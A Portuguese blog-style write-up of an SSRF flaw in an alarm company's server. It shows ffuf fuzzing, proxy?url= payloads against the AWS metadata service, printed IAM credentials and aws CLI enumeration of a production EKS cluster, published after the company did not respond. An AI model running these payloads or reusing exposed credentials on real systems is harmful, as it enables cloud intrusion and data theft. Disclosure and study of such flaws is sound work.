
## 🛑 Vulnerabilidade: SSRF (Server-Side Request Forgery)

Por curiosidade, certo dia decidi interceptar a conexão de um comando feito por um app de um sistema de segurança. Notei que, ao desativar o alarme, eu recebia duas requisições:

A primeira era para `o98808.link-simbolico.us.sen.io`

A segunda para `http://security-server.simbolico.com.br`

O primeiro endereço não me chamou muita atenção por parecer ser um servidor em nuvem, como a AWS, o que é bem comum. Já o segundo me chamou bastante atenção — primeiro por ser um endpoint sem criptografia (HTTP), e segundo por aparentar ser um endpoint interno.

Acessei esse segundo endpoint para ver o que ele trazia, e a única coisa exibida na página era um JSON com a data e a hora atual. Isso me deixou ainda mais curioso e me perguntei: “por que só isso? Só data e hora?”. De início, imaginei que talvez fosse apenas para mostrar a hora em que o alarme foi desativado. Talvez eu estivesse certo, mas a curiosidade acabou me levando por outro caminho.

Resolvi fazer um fuzz na URL usando a ferramenta ffuf, com o seguinte comando:
`ffuf -u http://security-server.simbolico.com.br/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/big.txt`

Um comando simples, mas que trouxe um impacto considerável.

A maioria dos endpoints retornou 404, como esperado — o servidor aparentemente bloqueava qualquer requisição externa. Mas um único endpoint teve um comportamento diferente:
http://security-server.simbolico.com.br/proxy

Esse não retornou 404, e sim um erro 400, o que indica que o endpoint existe e está esperando algum dado que não foi enviado corretamente. Outra coisa estranha: a resposta demorou cerca de 6 segundos (Duration: 6061ms), o que é muito tempo para um erro — sinal de que ele provavelmente estava tentando acessar algo e falhou.

O nome proxy já levantava uma suspeita de SSRF (Server-Side Request Forgery). Então testei com:
`http://security-server.simbolico.com.br/proxy?url=http://google.com`

E... bingo! O servidor trouxe a página do Google em HTML. Isso já era uma PoC clara.
O parâmetro url= estava sendo interpretado corretamente e o servidor redirecionava para o conteúdo de forma funcional.

Esse comportamento é típico de aplicações vulneráveis a SSRF, especialmente quando não há nenhum tipo de validação sobre o destino da URL.

O mais interessante é que não precisei usar usuário/senha, nem passar -x proxy no curl — era tudo direto. Isso mostra que não se tratava de um proxy tradicional (como um Squid, por exemplo), mas sim de um proxy implementado na própria aplicação web.

Esse tipo de implementação, sem autenticação e sem filtragem, é extremamente perigoso.
Então fui além.

Lembrei do primeiro endereço que parecia estar na AWS, e resolvi testar:

`http://security-server.simbolico.com.br/proxy?url=http://169.254.169.254`

Esse IP é reservado internamente pela AWS para expor metadados da instância EC2 — ou seja, só é acessível de dentro da própria nuvem. O fato de o servidor conseguir responder significa que eu estava conseguindo forjar requisições internas através da aplicação vulnerável.

Com isso, acessei:

`/proxy?url=http://169.254.169.254/latest/meta-data/`

E recebi como resposta uma lista de caminhos, como esperado da API de metadados da AWS. Isso confirmou sem dúvidas o SSRF com acesso interno à nuvem.

Seguindo a enumeração, acessei o caminho:

`/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup`


E obtive como resposta credenciais temporárias de uma role IAM:

`{
  "AccessKeyId": "ASIATK764DKS64WMNJFL",
  "SecretAccessKey": "4Ubgj7Wr6PkyE8vsAQZuyiy3KZQDt4JErAeDBbLG",
  "Token": "...",
  "Expiration": "2025-05-29T15:30:31Z"
}
`
Com esses dados, configurei um perfil no AWS CLI com:

`aws configure --profile seg-ssrf`

E usei essas credenciais para explorar o ambiente com:

`aws ec2 describe-instances --profile seg-ssrf`


Resultado? Acesso completo à listagem de instâncias EC2!

As informações extraídas mostraram que:

A instância usa arquitetura x86_64, com volume EBS /dev/sda1

O IAM Role usado é AmazonSSMRoleForInstancesQuickSetup

A VPC é privada, com faixa IP 172.30.0.0/16

O grupo de segurança da instância se chama:
eks-cluster-sg-sigmax-prod-772457999

O nome sugere fortemente que se trata de um cluster Kubernetes via EKS.

A interface de rede tem tags como:

`{
  "aws:eks:cluster-name": "max-prod",
  "kubernetes.io/cluster/max-prod": "owned"
}`

Ou seja, a instância é parte de um cluster Kubernetes EKS em produção.

Segurança do Grupo de Segurança

O grupo de segurança analisado possui:

Porta TCP 32145 aberta para toda a VPC interna (172.30.0.0/16)

Permissão total (IpProtocol: -1) entre grupos de segurança (inclusive para grupos marcados como kafka)

Comunicação permitida para algumas portas específicas de monitoramento (Zabbix) e integração com ELBv2.

Isso mostra que o cluster possui comunicação lateral interna liberada, o que, combinado com a falha SSRF e credenciais IAM expostas, poderia permitir movimentação lateral e acesso a serviços internos sensíveis — como banco de dados, serviços internos, APIs privadas, e até pods do Kubernetes.

<ul>Essa exploração mostra claramente o risco real que uma falha SSRF mal protegida pode trazer em ambientes cloud:</ul>

<li>Extração de credenciais da AWS</li> 
<li>Acesso a instâncias EC2</li>  
<li>Mapeamento de estrutura interna (rede, roles, instâncias, VPCs, etc)</lil>  
<li>Possibilidade de pivoting lateral e persistência</li>

###

<p>A falha foi reportada diretamente à empresa responsável pelo sistema de segurança, com todos os detalhes técnicos necessários para correção. No entanto, não houve qualquer resposta ou iniciativa de mitigação por parte da empresa, mesmo após múltiplas tentativas de contato.

Dado o potencial crítico da vulnerabilidade e o risco que representa a usuários finais e à infraestrutura da nuvem da empresa, decidi documentar publicamente esta prova de conceito (PoC) para fins educacionais e de conscientização sobre segurança na nuvem.</p>
